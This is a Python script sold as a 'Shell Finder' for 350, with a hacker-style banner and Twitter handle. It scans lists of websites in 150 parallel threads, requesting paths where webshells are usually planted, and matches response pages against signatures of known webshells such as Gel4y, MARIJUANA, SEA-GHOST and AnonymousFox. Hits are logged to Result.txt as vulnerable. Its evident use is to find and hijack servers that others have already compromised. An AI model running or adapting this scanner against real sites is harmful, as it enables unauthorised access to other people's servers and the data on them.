# -*- coding:utf-8 -*-

import sys

import requests

import re

import random

import string

from multiprocessing.dummy import Pool

from colorama import Fore, init



init(autoreset=True)

fr = Fore.RED

fg = Fore.GREEN

requests.urllib3.disable_warnings()

banner = '''{}
                                                           
      
╔═╗╔═╗───╔╗──╔╗─────╔═╗─╔╗
║║╚╝║║───║╚╗╔╝║─────║║╚╗║║
║╔╗╔╗╠══╗╚╗║║╔╩═╦═╗─║╔╗╚╝╠══╦╗╔╗
║║║║║║╔╗║─║╚╝║╔╗║╔╗╗║║╚╗║║╔╗║╚╝║
║║║║║║╔╗║─╚╗╔╣╔╗║║║║║║─║║║╔╗║║║║
╚╝╚╝╚╩╝╚╝──╚╝╚╝╚╩╝╚╝╚╝─╚═╩╝╚╩╩╩╝  

   Price => 350
   Twitter : @Anon1995_Ops
   Shell Finder [Ma Van Nam]

\n'''.format(fr)


try:

    if len(sys.argv) > 1:

        target_file_path = sys.argv[1]
    else:
        print(banner)

        target_file_path = input("Enter Your Site List >> ")



    with open(target_file_path, mode='r', encoding='utf-8') as file:

        target = [line.strip() for line in file.readlines()]



    def ran(length):

        letters = string.ascii_lowercase

        return ''.join(random.choice(letters) for i in range(length))



    Pathlist = [
        '/sts.php',
        '/simple.php',
        '/about.php',
        '/priv8.php',
        '/wp-admin/options.php',
        '/dropdown.php',
        '/wp-content/index.php?x=ooo',
        '/chosen.php?p=',
        '/Gely4.php',
        '/autoload_classmap.php',
        '/gely4.php',
        '/wp-content/plugins/fix/up.php',
        '/wp-content/themes/travelscape/json.php',
        '/shell20211028.php',
        '/wp-content/themes/seotheme/db.php?u',
    ]



    class EvaiLCode:

        def __init__(self):

            self.headers = {

                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
        def URLdomain(self, site):

            if site.startswith("http://"):

                site = site.replace("http://", "")

            elif site.startswith("https://"):

                site = site.replace("https://", "")

            else:

                pass

            pattern = re.compile('(.*)/')

            while re.findall(pattern, site):

                sitez = re.findall(pattern, site)

                site = sitez[0]

            return site
        def checker(self, site):

            try:

                url = "http://" + self.URLdomain(site)

                for Path in Pathlist:

                    check = requests.get(url + Path, headers=self.headers, verify=False, timeout=15).content

                    if '-rw-r--r--' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<u><b>Yanz Webshell!</b> - PRIV8 WEB SHELL ORB YANZ BYPASS!</u>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>MSQ_403</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>#CLS-LEAK#</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<h1>[ Shin Bypassed ]</h1>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Tiny File Manager' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'name="uploader" id="uploader">' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Upload File : <input' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'type="submit" id="_upl" value="Upload">' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<span>Upload file:' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '>public_html' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'name="apx"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Ova-Tools' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>Management System</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<form action="" method="post" enctype="multipart/form-data"><input type="file" name="apx"><input type="submit"></form>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>Fuxxer</title>"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '      <input type="submit" name="submit" value="  >>">' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>Fuxxer</title>"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>{Ninja-Shell}</title>"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"></form>"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>Log In | ECWS</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>[ Avaa Bypassed ]</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>SEA-GHOST MINSHELL</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'SEA-GHOST MINSHELL' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '#0x2525' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>000</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Uname:' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'class="form-control" placeholder="@Passwrd" type="password" name="getpwd' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Doc Root:' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>Gel4y Mini Shell</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'method= "post" action= ""> <input type="input" name ="f_p" value= ""/><input type= "submit" value= "&gt;"' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Mr.Combet WebShell' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'ovatools.phpsuccess' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Cod3d By AnonymousFox' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'ovatools.phpsuccess' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Mad Tools Shell' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'KCT MINI SHELL 403' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if '<title>MARIJUANA</title>' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    if 'Webshell' in check.decode():  
                        print('[>>] {} --> {}[Vuln]'.format(url, fg)) 
                        open('Result.txt', 'a').write(url + Path + "\n")
                        break
                    else:

                        print('[-] {} --> {}[Not Vuln]'.format(url, fr))  # Corrected the print syntax



            except:

                pass



    Control = EvaiLCode()



    def RedZone(site):

        try:

            Control.checker(site)

        except:

            pass



    mp = Pool(150)

    mp.map(RedZone, target)

    mp.close()

    mp.join()

    input("Check Result.txt File")

except Exception as e:

    print(f"An error occurred: {e}")

